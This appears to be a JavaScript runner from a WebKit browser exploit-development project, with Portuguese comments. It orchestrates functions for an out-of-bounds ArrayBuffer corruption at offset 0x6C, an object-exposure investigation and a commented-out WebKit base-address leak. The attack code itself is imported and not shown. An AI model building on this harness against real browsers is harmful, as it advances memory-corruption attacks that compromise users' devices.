// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
// Atualizar a importação para incluir a nova função de investigação
import { executeRetypeOOB_AB_Test, investigateObjectExposureVia0x6C, attemptWebKitBaseLeakStrategy_OLD } from './testRetypeOOB_AB_ViaShadowCraft.mjs';

async function runRetypeOOB_AB_Strategy() {
    const FNAME_RUNNER = "runRetypeOOB_AB_Strategy";
    logS3(`==== INICIANDO Estratégia de "Re-Tipagem" do oob_array_buffer_real ====`, 'test', FNAME_RUNNER);
    await executeRetypeOOB_AB_Test(); // Valida a corrupção 0x6C
    logS3(`==== Estratégia de "Re-Tipagem" do oob_array_buffer_real CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

async function runInvestigationStrategy() {
    const FNAME_RUNNER = "runInvestigationStrategy";
    logS3(`==== INICIANDO Estratégia de Investigação de Exposição de Objeto ====`, 'test', FNAME_RUNNER);
    await investigateObjectExposureVia0x6C(); // Nova função investigativa
    logS3(`==== Estratégia de Investigação de Exposição de Objeto CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_Investigative';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Testes Avançados e Investigação ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Investigação";

    // 1. (Opcional, mas bom para confirmar) Validar a corrupção 0x6C
    // await runRetypeOOB_AB_Strategy();
    // await PAUSE_S3(MEDIUM_PAUSE_S3);

    // 2. Executar a investigação de exposição de objeto usando a corrupção 0x6C
    logS3(`\n==== FOCO: Investigando Exposição de Objetos via Corrupção 0x6C ====`,'test', FNAME);
    document.title = "Script 3 - Investigação de Corrupção";
    await runInvestigationStrategy();
    
    // A estratégia de leak anterior pode ser chamada aqui se a investigação der pistas sobre um offset real.
    // Por agora, vamos focar na investigação.
    // logS3(`\n==== TENTATIVA DE LEAK DE BASE (se houver novas pistas) ====`,'test', FNAME);
    // await attemptWebKitBaseLeakStrategy_OLD(); // Renomeada para _OLD para clareza

    logS3(`\n==== Script 3 CONCLUÍDO (Investigação) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;

    if (!document.title.includes("SUCCESS") && !document.title.includes("FAIL") && !document.title.includes("ERRO") && !document.title.includes("Concluída")) {
         document.title = "Script 3 Concluído - Investigação";
    }
}
